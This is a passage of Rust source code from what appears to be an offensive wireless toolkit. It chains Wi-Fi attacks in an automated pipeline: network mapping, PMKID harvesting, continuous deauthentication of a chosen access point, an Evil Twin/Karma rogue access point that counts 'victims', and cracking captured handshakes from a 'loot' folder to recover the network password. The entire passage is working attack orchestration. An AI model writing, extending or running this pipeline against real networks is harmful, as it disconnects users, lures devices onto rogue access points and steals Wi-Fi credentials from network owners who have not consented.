                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            1 => {
                // Step 2: Network mapping (active scan)
                let preflight_error = self.preflight_wireless_scan(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Mapping", cmd, 40)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            2 => {
                // Step 3: PMKID harvest
                let preflight_error = self.preflight_pmkid_capture(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: if bssid.is_empty() {
                        None
                    } else {
                        Some(bssid.to_string())
                    },
                    ssid: if ssid.is_empty() {
                        None
                    } else {
                        Some(ssid.to_string())
                    },
                    channel: if channel > 0 { channel } else { 0 },
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 70)? {
                    let pmkids = data
                        .get("pmkids_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            3 => {
                // Step 4: Deauth attacks
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let preflight_error = self.preflight_deauth_attack(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 64,
                    duration: 45,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 55)? {
                    let handshakes = if data
                        .get("handshake_captured")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false)
                    {
                        1
                    } else {
                        0
                    };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            4 => {
                // Step 5: Evil Twin/Karma
                let preflight_error = self.preflight_karma(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
                    interface: interface.to_string(),
                    duration: 60,
                    channel: if channel > 0 { channel } else { 6 },
                    ap_interface: None,
                    with_ap: false,
                    ssid_whitelist: None,
                    ssid_blacklist: None,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, 0, clients))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            5 => {
                // Step 6: Crack passwords
                let loot_dir = self.root.join("loot/Wireless");
                if loot_dir.exists() {
                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
                        use rustyjack_commands::WifiCrackArgs;
                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
                            file: handshake_path.to_string_lossy().to_string(),
                            ssid: Some(ssid.to_string()),
                            mode: "quick".to_string(),
                            wordlist: None,
                        }));
                        if let Some((_, data)) = self.dispatch_cancellable("Cracking", cmd, 120)? {
                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
                                return Ok(StepOutcome::Completed(Some((
                                    0,
                                    0,
                                    Some(password.to_string()),
                                    0,
                                    0,
                                ))));
                            }
                        }
                        return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
                    }
                }
                return Ok(StepOutcome::Skipped(
                    "No captured handshake available to crack".to_string(),
                ));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Find the most recent handshake export file in loot directory
    pub(crate) fn find_recent_handshake(&self, loot_dir: &Path) -> Option<PathBuf> {
        let mut newest: Option<(PathBuf, std::time::SystemTime)> = None;

        fn scan_for_handshakes(dir: &Path, newest: &mut Option<(PathBuf, std::time::SystemTime)>) {
            if let Ok(entries) = fs::read_dir(dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        scan_for_handshakes(&path, newest);
                    } else if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with("handshake_export_") && name.ends_with(".json") {
                            if let Ok(meta) = path.metadata() {
                                if let Ok(modified) = meta.modified() {
                                    if newest.as_ref().map(|(_, t)| modified > *t).unwrap_or(true) {
                                        *newest = Some((path.clone(), modified));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        scan_for_handshakes(loot_dir, &mut newest);
        newest.map(|(path, _)| path)
    }
}

fn pipeline_id(pipeline_type: PipelineType) -> &'static str {
    match pipeline_type {
        PipelineType::GetPassword => "get_password",
        PipelineType::MassCapture => "mass_capture",
        PipelineType::StealthRecon => "stealth_recon",
        PipelineType::CredentialHarvest => "credential_harvest",
        PipelineType::FullPentest => "full_pentest",
    }
}
